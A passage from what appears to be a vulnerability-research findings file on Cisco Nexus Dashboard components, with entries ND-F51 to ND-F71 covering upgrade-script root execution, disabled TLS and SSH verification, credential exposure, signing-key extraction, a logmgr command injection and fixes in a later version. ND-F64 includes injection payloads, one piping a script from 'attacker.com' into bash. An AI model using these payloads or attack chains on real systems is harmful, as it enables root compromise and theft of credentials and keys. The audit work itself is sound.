            "cert to /config, replacing the ND cluster trust anchor. "
            "The script runs as root (upgrade-helper binary is called by installerd running as root). "
            "Prerequisite: keyhole cookie auth (ND-F01 reads world-readable cookie) + ability to "
            "write a malicious ISO to any path on the ND node filesystem."
        ),
        "script_path": "upgrade-helper/etc/scripts/post-activate/10-k8s-service-activate",
        "controlled_inputs": {
            "iso": "$3 from caller, traceable to keyhole /upgrade/update?filepath=",
            "cdrom": "mktemp -d (attacker-provided ISO contents mounted here)",
            "atomixbin": "$cdrom/atomix — binary FROM attacker-controlled ISO",
        },
        "code_sequence": (
            "mount -o loop $iso $cdrom\n"
            "atomixbin=$cdrom/atomix\n"
            "$atomixbin update $iso\n"
            "cp $cdrom/manifestCert.pem /config/manifestCert.pem"
        ),
        "impact": "Root code execution on ND master node + replace cluster trust anchor cert",
        "combined_with": ["ND-F01", "ND-F45"],
    },

    "ND-F52": {
        "title": "upgrade-helper Inter-Service HTTPS: verify=False on All Internal REST Calls",
        "severity": "HIGH",
        "component": "upgrade-helper/etc/scripts/pre-activate/3-k8s-pre-activate.py, appcommon.py",
        "description": (
            "All upgrade-helper Python scripts make HTTPS calls to internal K8s services with "
            "requests.get(..., verify=False) and requests.post(..., verify=False). Affected services: "
            "(1) firmwared.firmwared.svc:443/api/v1/firmware/applications "
            "(2) resourcemgr.kubese.svc:443/api/config/delinstance "
            "(3) resourcemgr.kubese.svc:443/api/config/class/appinstances "
            "TLS certificate verification is disabled across ALL inter-service upgrade calls. "
            "An attacker with the ability to manipulate K8s DNS or ARP (reachable from within the "
            "cluster) can MITM the upgrade pipeline, injecting application lists or deletion "
            "responses. The firmwared application list drives upgrade decisions (which apps to "
            "delete, which to preserve) — a poisoned response can suppress or trigger deletion "
            "of running services during the upgrade window."
        ),
        "affected_endpoints": [
            "firmwared.firmwared.svc:443/api/v1/firmware/applications (GET, POST)",
            "firmwared.firmwared.svc:443/api/v1/firmware/images (GET)",
            "resourcemgr.kubese.svc:443/api/config/delinstance (POST)",
            "resourcemgr.kubese.svc:443/api/config/class/appinstances (GET)",
        ],
        "code_pattern": "requests.get(url, verify=False, timeout=(15, 15))",
        "combined_with": ["ND-F51"],
    },

    "ND-F53": {
        "title": "upgrade-helper Migration State Tracked in Unauthenticated etcd — Replay/Bypass via etcdctl",
        "severity": "HIGH",
        "component": "upgrade-helper/etc/scripts/pre-activate/3-k8s-pre-activate.py check_migration_done()",
        "description": (
            "The upgrade-helper tracks whether K8s migration has been performed by reading/writing "
            "a plain etcd key: /k8_migration_to_nd_done. This key is read via "
            "/mnt/atom/k8/usr/local/bin/etcdctl get /k8_migration_to_nd_done "
            "and written via etcdctl put /k8_migration_to_nd_done <hostname>. "
            "Since ND uses etcd without auth (ND-F03, confirmed in start-kms.sh), any process with "
            "etcdctl access can: "
            "(1) DELETE the key to trigger migration re-run on next upgrade (replay) "
            "(2) SET the key to permanently skip migration even on fresh installs "
            "(3) SET the key to a different hostname to confuse multi-node upgrade coordination. "
            "The etcd config is read from /etc/etcd.cfg (export statements) — this file reveals "
            "the etcdctl client cert paths and endpoints used during upgrade."
        ),
        "etcd_key": "/k8_migration_to_nd_done",
        "config_file": "/etc/etcd.cfg (exports: ETCDCTL_* env vars, client cert paths)",
        "code": (
            "ret, out = run('/mnt/atom/k8/usr/local/bin/etcdctl get /k8_migration_to_nd_done')\n"
            "if out != '': return False  # migration already done — skip\n"
            "ret, out = run('/mnt/atom/k8/usr/local/bin/etcdctl put /k8_migration_to_nd_done ' + socket.gethostname())"
        ),
        "combined_with": ["ND-F03"],
    },

    "ND-F54": {
        "title": "upgrade-helper Pre-Activate: tempfile.mktemp() TOCTOU + Temp File Content Leak (Commented-Out Removal)",
        "severity": "MEDIUM",
        "component": "upgrade-helper/etc/scripts/pre-activate/3-k8s-pre-activate.py create_config_map()",
        "description": (
            "The create_config_map() function uses tempfile.mktemp() (deprecated, TOCTOU-unsafe) "
            "to generate a temp filename, then opens that file to write K8s ConfigMap YAML. "
            "tempfile.mktemp() returns a name without creating the file, creating a race between "
            "filename generation and file creation where an attacker can place a symlink at the "
            "returned path (e.g., to /config/syscfg.yaml or /etc/etcd.cfg) to trigger an overwrite. "
            "Additionally: the cleanup line os.remove(tmp_file) is commented out (# os.remove(tmp_file)), "
            "meaning K8s ConfigMap configuration files persist in /tmp/ after each upgrade pre-activate "
            "run. These files contain pod specs, deployment configs, and ConfigMap data."
        ),
        "code": (
            "tmp_file = tempfile.mktemp()  # INSECURE — TOCTOU between name generation and open()\n"
            "with open(tmp_file, 'w') as f: yaml.dump(config, f)\n"
            "# os.remove(tmp_file)  <-- COMMENTED OUT — file persists"
        ),
        "secondary_bug": "path typo: '/date/services/k8_secure/app_log_migration/' should be '/data/...' — PV specs written to /date/ (filesystem root)",
        "combined_with": ["ND-F51"],
    },

    "ND-F55": {
        "title": "upgrade-helper Go Binary: Built with -s -w (pclntab Stripped) — CI/CD Build Flag Evidence",
        "severity": "INFO",
        "component": "upgrade-helper binary /tmp/nd-oci-deep/upgrade-helper/bin/upgrade-helper",
        "description": (
            "The upgrade-helper binary (50MB, go1.19.10 + CGo, stripped ELF) was built with "
            "'-ldflags=-w -s': -w removes DWARF debug info, -s removes the symbol table AND pclntab. "
            "Build metadata from .go.buildinfo section: "
            "  path: golang.cisco.com/spm/cmd/upgrade-helper "
            "  module: golang.cisco.com/spm (devel) "
            "  git revision: 8b9dab7faed55ceabb97d764b2fddcb5265f759b "
            "  build time: 2025-06-09T16:14:28Z "
            "  GOARCH=amd64, CGO_ENABLED=1 "
            "Key dependencies: "
            "  containerd v1.6.14 (CVE-2023-25153, CVE-2023-25173) "
            "  containers/image v5.23.1 (OCI image pull/verify) "
            "  containers/ocicrypt v1.1.5 (OCI encryption) "
            "  coreos/etcd v3.3.15+incompatible (2019, multiple CVEs) "
            "  proglottis/gpgme v0.1.3 (GPG signature verify, CGo) "
            "  opencontainers/umoci v0.4.7 (OCI image manipulation) "
            "The pclntab stripping means runtime stack traces are absent and RE requires "
            "prologue-based function detection + semantic encoding."
        ),
        "binary_path": "/tmp/nd-oci-deep/upgrade-helper/bin/upgrade-helper",
        "build_flags": "-ldflags=-w -s",
        "go_version": "go1.19.10",
        "cgo_deps": ["gpgme", "devicemapper (libdevmapper)"],
        "notable_old_deps": {
            "coreos/etcd": "v3.3.15 from 2019 — EOL, multiple CVEs",
            "containerd": "v1.6.14 — CVE-2023-25153 (OCI image memory exhaustion)",
        },
    },
    "ND-F56": {
        "title": "bootstrap.expect + node_join.expect: CIMC Password and Cluster Join Passphrase as CLI argv — Visible in /proc/pid/cmdline",
        "severity": "HIGH",
        "component": "bootstrap/scripts/bootstrap.expect, bootstrap/scripts/node_join.expect",
        "description": (
            "Both bootstrap expect scripts pass credentials as positional CLI arguments, making them "
            "visible to any local process that reads /proc/<pid>/cmdline during bootstrap execution. "
            "bootstrap.expect: argv[2] = CIMC admin password; argv[3] = jsonblob_file path. "
            "node_join.expect: argv[2] = cluster join passphrase ('token'), argv[3] = CIMC password. "
            "The bootstrap JSON blob (argv[3] of bootstrap.expect) contains cluster init material: "
            "  nodeName, nodeRole, clusterUUID, seedList, appNetwork, serviceNetwork, admin_passwd (hash). "
            "Any co-resident process (container with hostPID, or any ND application user) with read access "
            "to /proc can harvest the CIMC admin credential and the cluster join passphrase from a live "
            "bootstrap or node-join operation. The passphrase controls cluster membership; CIMC admin "
            "grants full BMC/IPMI access to the physical host."
        ),
        "code_evidence": {
            "bootstrap.expect:13": "set password [lindex $argv 2]",
            "bootstrap.expect:41": "set cimcprompt [ cimclogin $cimc $user $password ]",
            "node_join.expect:7": "set token [lindex $argv 2]",
            "node_join.expect:9": "set password [lindex $argv 3]",
            "node_join.expect:23": 'send "acs node-join --passphrase $token\\n"',
        },
        "exposed_material": {
            "CIMC_admin_password": "argv[2] in bootstrap.expect — full IPMI/BMC admin",
            "cluster_join_passphrase": "argv[2] in node_join.expect — controls cluster membership",
            "CIMC_password_node_join": "argv[3] in node_join.expect — duplicate CIMC admin",
        },
        "proc_read_vector": "/proc/<pid>/cmdline — readable by any process on the node",
        "cluster_bootstrap_json_fields": [
            "nodeName", "nodeRole", "clusterUUID", "seedList",
            "appNetwork", "serviceNetwork", "admin_passwd",
        ],
    },
    "ND-F57": {
        "title": "bootstrap-common.expect cimclogin: StrictHostKeyChecking=no + UserKnownHostsFile=/dev/null — CIMC SSH Host Identity Never Verified",
        "severity": "HIGH",
        "component": "bootstrap/scripts/bootstrap-common.expect, proc cimclogin (line 159), proc oob_cimclogin (line 230)",
        "description": (
            "Both CIMC SSH connection procs in bootstrap-common.expect disable host key verification "
            "unconditionally: StrictHostKeyChecking=no and UserKnownHostsFile=/dev/null. "
            "No host key pinning exists; the CIMC SSH server is never authenticated before credentials "
            "and bootstrap JSON are sent. An attacker with network adjacency during provisioning can "
            "MITM the CIMC SSH session and intercept: (1) CIMC admin credentials, (2) the full "
            "bootstrap JSON blob containing clusterUUID, seedList, and admin_passwd hash, "
            "(3) acs node-join passphrase (cluster membership secret). "
            "The same pattern applies to the OOB path (oob_cimclogin, line 230), meaning both the "
            "primary CIMC path and the out-of-band management path are MITM-exposed. "
            "Combined with ND-F58 (broken KEX fallback), an active network adversary can both downgrade "
            "the key exchange and intercept the session."
        ),
        "code_evidence": {
            "bootstrap-common.expect:159": (
                "spawn ssh -l $user -o HostKeyAlgorithms=ssh-rsa "
                "-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null $cimc"
            ),
            "bootstrap-common.expect:165": (
                "spawn ssh -l $user -o StrictHostKeyChecking=no "
                "-o UserKnownHostsFile=/dev/null -o KexAlgorithms=+diffie-hellman-group1-sha1 $cimc"
            ),
            "bootstrap-common.expect:230": (
                "spawn ssh -l $user -o HostKeyAlgorithms=ssh-rsa "
                "-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null $oobip"
            ),
        },
        "mitm_intercept_material": [
            "CIMC admin credentials",
            "bootstrap JSON blob (clusterUUID, seedList, admin_passwd hash)",
            "acs node-join passphrase",
        ],
        "affected_scripts": ["bootstrap.expect", "bootstrap-common.expect", "node_join.expect"],
        "combined_with": ["ND-F58", "ND-F56"],
    },
    "ND-F58": {
        "title": "bootstrap-common.expect cimclogin Fallback: KexAlgorithms=+diffie-hellman-group1-sha1 — Logjam-Vulnerable DH Key Exchange",
        "severity": "HIGH",
        "component": "bootstrap/scripts/bootstrap-common.expect, proc cimclogin fallback (line 162-165)",
        "description": (
            "When the initial CIMC SSH connection attempt encounters a 'diffie-hellman-group1' negotiation "
            "failure, bootstrap-common.expect automatically retries with "
            "'-o KexAlgorithms=+diffie-hellman-group1-sha1' enabled. "
            "diffie-hellman-group1-sha1 uses 1024-bit DH (Oakley Group 2) which is the exact cipher "
            "targeted by the Logjam attack (CVE-2015-4000) — precomputed DH discrete log tables at "
            "1024-bit allow passive decryption of the session. "
            "Trigger condition: the first SSH attempt fails KEX (e.g., because the CIMC presents only "
            "DH group1 — common on older UCS firmware). The fallback fires automatically with no "
            "operator intervention. "
            "Because ND-F57 disables host key checking and this finding downgrades KEX to Logjam-vulnerable "
            "DH, an adversary who can position on the management network during bootstrap can "
            "MITM or passively decrypt the CIMC SSH session and recover all transmitted material."
        ),
        "code_evidence": {
            "bootstrap-common.expect:162-165": (
                '"diffie-hellman-group1" {\\n'
                "    # retry with DH group1 enabled\\n"
                "    spawn ssh -l $user -o StrictHostKeyChecking=no "
                "-o UserKnownHostsFile=/dev/null -o KexAlgorithms=+diffie-hellman-group1-sha1 $cimc"
            ),
        },
        "cve": "CVE-2015-4000 (Logjam — 1024-bit DH discrete log precomputation)",
        "trigger": "Automatic on KEX negotiation failure — no operator action required",
        "combined_with": ["ND-F57"],
    },
    "ND-F59": {
        "title": "bootstrap-common.expect + node_join.expect: curl --insecure for All Redfish BMC API Calls",
        "severity": "MEDIUM",
        "component": "bootstrap/scripts/bootstrap-common.expect verify_redfish_service, bootstrap/scripts/node_join.expect",
        "description": (
            "All Redfish API interactions in the bootstrap scripts use 'curl --insecure', disabling TLS "
            "certificate verification on the BMC management interface. Redfish is the REST API layer for "
            "CIMC (Cisco UCS BMC) — it controls power state, serial console, firmware update, and sensor "
            "data. Without TLS verification, an adversary with management network adjacency can present "
            "a self-signed cert and intercept Redfish API calls, including any credentials or session "
            "tokens transmitted in the Redfish session. Combined with ND-F57 (CIMC SSH no host auth), "
            "the entire bootstrap provisioning channel — both SSH and REST/Redfish — is unauthenticated "
            "at the transport layer."
        ),
        "code_evidence": {
            "bootstrap-common.expect:verify_redfish_service": (
                "exec curl --max-time 3 --silent --insecure --fail $redfish_url"
            ),
            "node_join.expect:27": (
                "if {[catch {exec curl --max-time 3 --silent --insecure --fail $redfish_url} ...]}"
            ),
        },
        "redfish_capabilities_exposed": [
            "power control (on/off/reset)",
            "serial console access",
            "BMC firmware update",
            "sensor and health data",
            "virtual media mount",
        ],
        "combined_with": ["ND-F57", "ND-F58"],
    },
    "ND-F60": {
        "title": "spm-lcm.bin: CGo GPGME key_secret + subkey_secret Bindings — Private Signing Key Extraction From kms_etcd Mount",
        "severity": "HIGH",
        "component": "spm-lcm container /bin/spm-lcm.bin (golang.cisco.com/bootstrap/cmd/spm-lcm), CGo GPGME bindings",
        "description": (
            "spm-lcm.bin (47MB, go1.19.10, CGo, -s -w stripped) exposes CGo bindings to two GPGME "
            "private-key-access functions: Cfunc_key_secret and Cfunc_subkey_secret. "
            "These GPGME functions return the secret key material for a GPG key or subkey. "
            "The spm pod (which runs spm-lcm) mounts /data/services/kms_etcd from the host — "
            "the same path that holds ALL cluster TLS private keys (ND-F50). The KMS etcd store "
            "also holds the GPG keyring used to sign ND service packages and firmware images. "
            "With code execution in the spm-lcm context + kms_etcd mount access, an attacker can "
            "invoke the GPGME key_secret binding to extract the private signing key from the keyring, "
            "then sign arbitrary service packages or firmware images that spm-lcm will accept as valid. "
            "This bypasses the cryptographic signature verification enforced by "
            "'error.missing.signature.file.cannot.install.app' and "
            "'error.verify.error.verifying.signature.file'."
        ),
        "binary": "/tmp/nd-oci/spm-lcm/bin/spm-lcm.bin",
        "build_path": "golang.cisco.com/bootstrap/cmd/spm-lcm",
        "module": "golang.cisco.com/bootstrap (devel)",
        "go_version": "go1.19.10",
        "build_flags": "-ldflags=-w -s",
        "cgo_bindings": {
            "_cgo_4a87491e54c3_Cfunc_key_secret": "GPGME: retrieve secret key material from a GPG key",
            "_cgo_4a87491e54c3_Cfunc_subkey_secret": "GPGME: retrieve secret key material from a GPG subkey",
            "_cgo_4a87491e54c3_Cfunc_gogpgme_set_passphrase_cb": "GPGME: set passphrase callback (needed to unlock the private key)",
        },
        "privileged_mount": "/data/services/kms_etcd (ALL cluster TLS keys + GPG signing keyring)",
        "combined_with": ["ND-F50"],
        "source_ref": "aci-github.cisco.com/nd/spm@v0.0.0-20240326050141-a908b8ccc70b",
    },
    "ND-F61": {
        "title": "spm-lcm.bin: Multi-Command Binary Contains firmwared Code — Enlarged Blast Radius from Any Code Exec in spm-lcm",
        "severity": "HIGH",
        "component": "spm-lcm container /bin/spm-lcm.bin, golang.cisco.com/spm/cmd/firmwared/errors.init",
        "description": (
            "spm-lcm.bin contains the firmwared error package "
            "(golang.cisco.com/spm/cmd/firmwared/errors.init is initialized at startup), "
            "indicating this binary implements both the lifecycle manager AND the firmwared "
            "service package manager functions in a single 47MB binary. "
            "firmwared is the ND service that manages service package installation, "
            "upgrade, and lifecycle across all ND applications. "
            "String evidence: 'expandServicePackageImagesToHelm success', "
            "'failed to downloadReleaseServicePackages', "
            "'error.failed.read.spec.file.firmwared.volume', "
            "'error.firmwared.api.failed.error: Firmwared API: {{.appUrl}} failed'. "
            "Code execution in spm-lcm therefore grants control over: "
            "(1) service package install/activate/rollback for ALL ND apps, "
            "(2) firmware upgrade orchestration (ND-F51 path), "
            "(3) helm template expansion from app.yaml (potential injection), "
            "(4) kubectl execution with root kubeconfig (ND-F50). "
            "The firmwared API URL template '{{.appUrl}}' in error messages indicates "
            "dynamic URL construction — if any portion is attacker-influenced, SSRF applies."
        ),
        "binary_size": "47MB",
        "contains_packages": [
            "golang.cisco.com/bootstrap/cmd/spm-lcm",
            "golang.cisco.com/spm/cmd/firmwared (embedded)",
        ],
        "key_capabilities_from_strings": [
            "expandServicePackageImagesToHelm — helm expansion from app.yaml",
            "downloadReleaseServicePackages — fetches packages from remote URL",
            "kubectl execution with error.failed.executing.kubectl",
            "Firmwared API calls with dynamic appUrl",
            "post-install hooks execution (error.failed.execute.post.install)",
        ],
        "combined_with": ["ND-F50", "ND-F51", "ND-F60"],
        "source_ref": "aci-github.cisco.com/nd/spm@v0.0.0-20240326050141-a908b8ccc70b",
    },
    "ND-F62": {
        "title": "spm-lcm.bin Signature Verification: 3-Stage Pipeline — Missing File vs. Crypto Verify Are Separate Error Paths",
        "severity": "MEDIUM",
        "component": "spm-lcm container /bin/spm-lcm.bin signature verification logic",
        "description": (
            "spm-lcm implements app signature verification as a 3-stage pipeline with distinct "
            "error messages for each stage, confirming the full pipeline in source: "
            "  Stage 1: FILE EXISTENCE CHECK — 'missing signature file, cannot install app' "
            "  Stage 2: FILE READ — 'verify: error reading signature file :{{.err}}' "
            "  Stage 3: UNMARSHAL — 'sign: error unmarshalling signature file :{{.err}}' "
            "  Stage 4: CRYPTO VERIFY — 'verify: error verifying signature file :{{.err}}' "
            "The separation of 'missing file' from 'verify error' into different error codes "
            "means error handling for missing vs. crypto-failed signatures is distinct. "
            "The CGo GPGME bindings (ND-F60) handle Stage 4. "
            "The firmware image verification has its own path: "
            "'failed to verify firmware image: {{.path}}' — confirming the upgrade-helper "
            "ISO path (ND-F51) and the spm-lcm app install path use separate verify functions. "
            "If Stage 1 (file existence) can be satisfied without a valid signature — "
            "e.g., by placing an empty or malformed .sig file — Stages 2-4 still gate on "
            "unmarshal and crypto verify. The crypto verify is NOT bypassable by file existence alone."
        ),
        "verification_stages": {
            "1_existence": "error.missing.signature.file.cannot.install.app",
            "2_read": "error.verify.error.reading.signature.file",
            "3_unmarshal": "error.sign.error.unmarshalling.signature.file",
            "4_crypto": "error.verify.error.verifying.signature.file",
        },
        "note": (
            "The crypto verify stage uses GPGME (ND-F60 CGo bindings). "
            "The private key extraction path (ND-F60) bypasses this gate entirely by "
            "allowing legitimate signing of attacker-controlled packages."
        ),
        "combined_with": ["ND-F60", "ND-F51"],
    },
    "ND-F63": {
        "title": "logmgr log_handler.py verify_logger_crds(): K8s Namespace Annotation → Arbitrary Config File Write at /var/lib/k8s-rotation-config/",
        "severity": "HIGH",
        "component": "logmgr container /usr/bin/log_handler.py, verify_logger_crds()",
        "description": (
            "verify_logger_crds() runs 'kubectl get ns -A -o yaml' then parses the "
            "'logger.case.cncf.io' annotation from each namespace as JSON. "
            "The parsed spec dict is written directly to disk at "
            "'/var/lib/k8s-rotation-config/<namespace>-<spec[storageID]>' with no "
            "sanitization of namespace name or storageID value. "
            "An attacker with 'kubectl annotate namespace' permission (or the ability to "
            "create a namespace with an arbitrary name) can write arbitrary JSON to any "
            "filename of the form '<ns>-<storageID>' under /var/lib/k8s-rotation-config/. "
            "The storageID is attacker-controlled from the annotation value. "
            "Written configs are subsequently loaded by LogConfig.read_cfg() and their "
            "'hostPath' and 'path' fields feed shell=True subprocess calls (ND-F64)."
        ),
        "source_file": "logmgr:/usr/bin/log_handler.py",
        "vulnerable_code": (
            "spec = json.loads(item['metadata']['annotations']['logger.case.cncf.io'])\n"
            "cfg_name = item['metadata']['name'] + \"-\" + spec['storageID']\n"
            "cfg_file = os.path.join(CRD_CFG_PATH, cfg_name)  # CRD_CFG_PATH=/var/lib/k8s-rotation-config\n"
            "with open(cfg_file, 'w') as fobj:\n"
            "    json.dump(spec, fobj)"
        ),
        "attacker_input": {
            "namespace_name": "arbitrary — becomes first part of filename",
            "storageID": "from annotation JSON — becomes suffix of filename, no validation",
            "hostPath": "from annotation JSON — feeds shell=True df command (ND-F64)",
            "path": "from annotation JSON — appended to hostPath, also feeds shell cmd",
            "rotation": "from annotation JSON — drives log file operations",
        },
        "combined_with": ["ND-F64"],
    },
    "ND-F64": {
        "title": "logmgr log_handler.py findUsage(): shell=True Command Injection via Attacker-Controlled Config hostPath/path",
        "severity": "HIGH",
        "component": "logmgr container /usr/bin/log_handler.py, findUsage() + LogConfig.read_cfg()",
        "description": (
            "findUsage() constructs a shell command by string-formatting the log directory path "
            "with no sanitization, then executes it with shell=True: "
            "  cmd = 'df -h {} --output=pcent | tail -n1'.format(directory) "
            "  subprocess.run(cmd, shell=True, ...) "
            "The 'directory' variable is LogConfig.self.dir, built as: "
            "  self.dir = cfg['hostPath'] + '/' + cfg['path'] "
            "where cfg is loaded from a JSON file at /var/lib/k8s-rotation-config/ (ND-F63). "
            "An attacker who writes a config file via ND-F63 with a crafted hostPath containing "
            "shell metacharacters achieves code execution as the logmgr process user (root, "
            "KUBECONFIG=/root/.kube/config). "
            "Example payload: hostPath = '/logs; curl attacker.com/shell.sh | bash #', path = 'x'. "
            "Trigger: logmgr cleanup_as_needed() is called when disk usage exceeds 90%, "
            "or log handler runs on schedule. "
            "Secondary: run() is also used for 'kubectl get ns' itself — the KUBECONFIG "
            "environment is pre-set to /root/.kube/config, so injected commands inherit cluster-admin."
        ),
        "source_file": "logmgr:/usr/bin/log_handler.py",
        "vulnerable_code": (
            "def findUsage(directory):\n"
            "    cmd = 'df -h {} --output=pcent | tail -n1'.format(directory)  # NO SANITIZATION\n"
            "    ret, out = run(cmd)\n\n"
            "def run(cmd):\n"
            "    proc = subprocess.run(cmd, stdout=PIPE, stderr=DEVNULL, shell=True, timeout=5)"
        ),
        "injection_example": "hostPath = '/logs; id > /tmp/pwned #'",
        "kubeconfig": "/root/.kube/config (set at module level, inherited by injected commands)",
        "combined_with": ["ND-F63"],
    },
    "ND-F65": {
        "title": "logmgr log_sanitize.py sanitizeTarball(): Unbounded Recursion on Nested Tarballs — Tar Bomb DoS",
        "severity": "MEDIUM",
        "component": "logmgr container /usr/bin/log_sanitize.py, sanitizeTarball()",
        "description": (
            "sanitizeTarball() recursively processes nested tarballs without any depth limit "
            "or size guard: "
            "  if not (mem.name.endswith('.tar') or mem.name.endswith('.tgz')): "
            "      santizeFile(file, drop_lines) "
            "  else: "
            "      sub_tar_fd = io.BytesIO() "
            "      sanitizeTarball(file, sub_tar_fd, drop_lines)  # unbounded recursion "
            "Additionally, santizeFile() calls f.readlines() with no size limit, loading the "
            "entire file into memory. A deeply nested tarball (quine-style) placed in "
            "/logs or /data/services/app_logs will cause stack exhaustion or OOM. "
            "log_sanitize.py runs against all files in /logs and /data/services/app_logs "
            "when /var/lib/k8ctl/bootstrapped exists — a predictable post-bootstrap trigger. "
            "Any process with write access to the log directories can place a tar bomb. "
            "logmgr runs as root — OOM or stack overflow terminates the logmgr process, "
            "disabling log management for the cluster."
        ),
        "source_file": "logmgr:/usr/bin/log_sanitize.py",
        "vulnerable_code": (
            "def sanitizeTarball(in_fd, out_fd, drop_lines):\n"
            "    for mem in in_tar.getmembers():\n"
            "        else:\n"
            "            sub_tar_fd = io.BytesIO()\n"
            "            sanitizeTarball(file, sub_tar_fd, drop_lines)  # NO DEPTH LIMIT\n\n"
            "def santizeFile(filebytes, search_strings):\n"
            "    for line in f.readlines():  # NO SIZE LIMIT"
        ),
        "trigger": "Any file in /logs or /data/services/app_logs with .tar/.tgz extension",
    },
    "ND-F66": {
        "title": "logmgr log_sanitize.py Done-Flag Bypass: Create .done File to Permanently Skip Sanitization of Any Directory",
        "severity": "MEDIUM",
        "component": "logmgr container /usr/bin/log_sanitize.py, sanitize() done_flag logic",
        "description": (
            "sanitize() checks for a done flag file before processing any directory: "
            "  done_flag = os.path.join(VAR_ROOT, f'{in_path.replace(\"/\", \"_\")}.done') "
            "  if os.path.exists(done_flag): return "
            "VAR_ROOT = /data/services/logmgr/var/sanitize. "
            "Any process with write access to /data/services/logmgr/var/sanitize/ can create "
            "a .done file for any target path, permanently preventing log_sanitize.py from "
            "ever sanitizing that directory. "
            "This means secrets logged to /logs or /data/services/app_logs will never be "
            "redacted from techsupport bundles — effectively neutralizing the sanitization "
            "pipeline for attacker-chosen log directories. "
            "Done flag path for /logs: '/data/services/logmgr/var/sanitize/_logs.done'. "
            "Once set, it persists until manually removed — survives pod restarts."
        ),
        "source_file": "logmgr:/usr/bin/log_sanitize.py",
        "vulnerable_code": (
            "done_flag = os.path.join(VAR_ROOT, f'{in_path.replace(\"/\", \"_\")}.done')\n"
            "if os.path.exists(done_flag):\n"
            "    return  # PERMANENTLY SKIPS — no TTL, no re-check"
        ),
        "bypass_paths": {
            "/logs": "_logs.done",
            "/data/services/app_logs": "_data_services_app_logs.done",
        },
    },
    "ND-F67": {
        "title": "logmgr log_sanitize.py SECRETS File — Reading /mnt/atom/logmgr/etc/sanitize-config/sanitize-ts.txt Reveals Complete ND Secret String Inventory",
        "severity": "MEDIUM",
        "component": "logmgr container /usr/bin/log_sanitize.py, SECRETS constant",
        "description": (
            "SECRETS = '/mnt/atom/logmgr/etc/sanitize-config/sanitize-ts.txt' "
            "is the text file containing every secret string that ND's log sanitizer "
            "redacts from techsupport bundles. Each line is a literal string match. "
            "Reading this file produces the complete inventory of secret material ND "
            "considers sensitive enough to scrub: service passwords, token prefixes, "
            "key material substrings, credential patterns. "
            "This is a reconnaissance primitive — the secrets list directly identifies "
            "which string patterns to look for in any log exfiltration. "
            "The file is on /mnt/atom (the atomix runtime mount, shared across containers), "
            "accessible to any pod with /mnt/atom access or exec into the logmgr container."
        ),
        "source_file": "logmgr:/usr/bin/log_sanitize.py",
        "file_path": "/mnt/atom/logmgr/etc/sanitize-config/sanitize-ts.txt",
        "access_vector": "/mnt/atom is hostPath shared across pods — readable from any pod with mntatom mount",
    },

    # ── Cross-version RE: 3.2.2m -> 4.3.1 delta ─────────────────────────────────
    "ND-F68": {
        "title": "4.3.1 Fix: ND-F64 shell=True Command Injection Remediated",
        "severity": "INFO",
        "component": "logmgr/log_handler.py (4.3.1)",
        "version_delta": "3.2.2m -> 4.3.1",
        "fix_description": (
            "findUsage() changed from f-string + shell=True to argv list form.\n"
            "3.2.2m: cmd = 'df -h {} --output=pcent | tail -n1'.format(directory)\n"
            "        proc = subprocess.run(cmd, shell=True, ...)\n"
            "4.3.1:  cmd = ['df', '-h', directory, '--output=pcent']\n"
            "        proc = subprocess.run(cmd, ...)  # no shell=True"
        ),
        "status": "FIXED in 4.3.1",
        "note": "Injection path via K8s annotation hostPath -> findUsage(self.dir) eliminated",
        "references": ["ND-F63", "ND-F64"],
    },
    "ND-F69": {
        "title": "4.3.1 Partial Fix: HostKeyAlgorithms Hardened on Primary Path, OOB Path Still Uses ssh-rsa",
        "severity": "HIGH",
        "component": "bootstrap/scripts/bootstrap-common.expect (4.3.1)",
        "version_delta": "3.2.2m -> 4.3.1",
        "code_evidence": {
            "line 158 (FIXED)":   "spawn ssh -l $user -o HostKeyAlgorithms=rsa-sha2-256,rsa-sha2-512 -o StrictHostKeyChecking=no ...",
            "line 164 (UNFIXED)": "spawn ssh -l $user -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o KexAlgorithms=+diffie-hellman-group1-sha1 $cimc",
            "line 229 (UNFIXED)": "spawn ssh -l $user -o HostKeyAlgorithms=ssh-rsa -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null $oobip",
        },
        "analysis": (
            "Line 158 (CIMC primary path) upgraded HostKeyAlgorithms from ssh-rsa to rsa-sha2-256,rsa-sha2-512. "
            "Line 229 (OOB IP path) still uses ssh-rsa (deprecated RFC 8332). "
            "StrictHostKeyChecking=no and UserKnownHostsFile=/dev/null persist on ALL three spawn sites — "
            "the MITM attack surface from ND-F57 is unchanged. "
            "Pattern: single grep-and-replace fix, not an audit of all call sites."
        ),
        "status": "PARTIAL FIX — MITM surface (ND-F57) unchanged; OOB path still uses ssh-rsa",
        "references": ["ND-F57"],
    },
    "ND-F70": {
        "title": "4.3.1 Persists: Logjam KEX Fallback Unchanged — KexAlgorithms=+diffie-hellman-group1-sha1",
        "severity": "HIGH",
        "component": "bootstrap/scripts/bootstrap-common.expect (4.3.1)",
        "version_delta": "3.2.2m -> 4.3.1",
        "code_evidence": {
            "bootstrap-common.expect:164 (4.3.1)": (
                "spawn ssh -l $user -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "
                "-o KexAlgorithms=+diffie-hellman-group1-sha1 $cimc"
            ),
        },
        "status": "UNFIXED — identical to 3.2.2m",
        "references": ["ND-F58"],
    },
    "ND-F71": {
        "title": "4.3.1 Architecture Change: firmwared Extracted to Standalone Container; GPGME Surface Relocated",
        "severity": "MEDIUM",
        "component": "spm-lcm (4.3.1) + firmwared container",
        "version_delta": "3.2.2m -> 4.3.1",
        "build_info": {
            "3.2.2m_spm_lcm": "go1.19.10, path golang.cisco.com/bootstrap/cmd/spm-lcm",
            "4.3.1_spm_lcm":  "go1.25.8, path golang.cisco.com/bootstrap/cmd/spm-lcm",
        },
        "analysis": (
            "In 3.2.2m, spm-lcm contained firmwared code (golang.cisco.com/spm/cmd/firmwared/errors.init) "
            "and CGo GPGME bindings (Cfunc_key_secret, Cfunc_subkey_secret) for private signing key access. "
            "In 4.3.1: firmwared is a standalone container; spm-lcm calls it via API "
            "('Firmwared API: {{.appUrl}} failed with error: {{.err}}'). "
            "CGo GPGME bindings absent from 4.3.1 spm-lcm binary — moved to firmwared process. "
            "ND-F60 class finding persists but requires firmwared binary analysis in 4.3.1."
        ),
        "pending": "firmwared 4.3.1 binary extraction and GPGME CGo analysis",
        "references": ["ND-F60", "ND-F61"],
    },
    "ND-F72": {
